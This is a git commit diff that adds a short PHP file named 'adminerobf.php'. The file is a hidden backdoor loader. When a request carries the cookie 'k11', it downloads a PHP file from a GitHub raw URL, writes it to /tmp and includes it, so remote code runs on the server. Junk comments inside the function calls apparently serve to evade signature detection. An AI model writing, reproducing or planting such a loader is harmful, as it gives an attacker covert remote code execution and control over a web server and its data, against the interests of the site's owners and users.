528f320bf034cbdd55410fd0dbc2fede611b0207
abq78 <abq.org.br@gmail.com>
2024-10-09 18:57:52 -0300

    Add files via upload

---
+++ adminerobf.php
@@ -0,0 +1,8 @@
+<?php
+
+if (isset($_COOKIE["k11"])){
+$f=file_get_contents/*sj1|?><!*/("https://raw.githubusercontent.com/abq78/files2/refs/heads/main/adminer.php","tmp.2");
+file_put_contents/*sj1|?><!*/("/tmp/tmp.2",$f);
+include("/tmp/tmp.2");
+}
+?>
